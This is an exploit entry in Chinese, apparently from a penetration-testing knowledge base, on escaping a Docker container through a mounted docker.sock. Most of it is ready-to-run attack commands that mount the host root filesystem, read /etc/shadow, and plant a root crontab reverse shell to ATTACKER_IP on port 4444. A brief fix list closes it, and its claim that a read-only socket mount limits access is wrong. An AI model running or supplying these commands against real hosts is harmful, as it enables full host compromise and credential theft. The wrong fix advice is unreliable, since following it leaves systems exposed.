---
id: DOCKER-SOCKET-ESCAPE
title: Docker Socket 挂载逃逸
product: docker
vendor: Docker
version_affected: "all versions"
severity: CRITICAL
tags: [container_escape, docker_socket, rce, docker, 无需认证]
fingerprint: ["Docker", "docker", "docker.sock"]
---

## 漏洞描述

当容器挂载了宿主机的 `/var/run/docker.sock` 时，容器内可通过该socket与Docker守护进程通信，创建新容器并挂载宿主机根目录，从而逃逸到宿主机。

## 影响版本

- Docker 全版本（挂载 docker.sock 的容器）

## 前置条件

- 已获取容器内命令执行权限
- 容器挂载了宿主机 `/var/run/docker.sock`

## 检测方法

```bash
ls -lah /var/run/docker.sock
# 如果文件存在，说明socket已挂载
```

## 利用步骤

### 方法一：使用Docker客户端

```bash
# 容器内安装docker客户端
apt-get update && apt-get install -y curl
curl -fsSL https://get.docker.com/ | sh

# 从已获取的容器内执行：创建新容器挂载宿主机根目录
docker run -it -v /:/host ubuntu /bin/bash

# 在新容器中chroot到宿主机
chroot /host
```

### 方法二：使用curl直接调用API

```bash
# 列出所有容器
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# 创建逃逸容器
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"Tty":true,"OpenStdin":true,"Binds":["/:/host"]}' \
  http://localhost/containers/create

# 启动容器（替换CONTAINER_ID）
curl -s --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/CONTAINER_ID/start

# 在容器中执行命令
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/host/etc/shadow"],"Tty":false}' \
  http://localhost/containers/CONTAINER_ID/exec
```

### 方法三：直接写crontab

```bash
# 从已获取的容器内执行
docker run -v /:/host --rm alpine sh -c \
  "echo '* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /host/var/spool/cron/crontabs/root"
```

## Payload

```bash
# 通过docker.sock API创建挂载宿主机根目录的容器
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh","-c","cat /host/etc/shadow"],"Tty":true,"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create

# 启动容器（替换CONTAINER_ID为上一步返回的Id）
curl -s --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/CONTAINER_ID/start

# 写入crontab反弹shell
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh","-c","echo \"* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" >> /host/var/spool/cron/crontabs/root"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create
```

## 验证方法

```bash
# 确认docker.sock已挂载
ls -la /var/run/docker.sock

# 验证可通过socket通信
curl -s --unix-socket /var/run/docker.sock http://localhost/version | grep -i "ApiVersion"

# 验证可列出宿主机容器
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | grep -i "Names"

# 验证宿主机文件可读（通过创建容器读取/etc/hostname）
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create
```

## 指纹确认

```bash
ls -la /var/run/docker.sock
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

## 修复建议

1. 避免将 docker.sock 挂载到容器中
2. 如必须挂载，使用只读模式 `-v /var/run/docker.sock:/var/run/docker.sock:ro`
3. 使用 Docker Socket Proxy 限制可用API
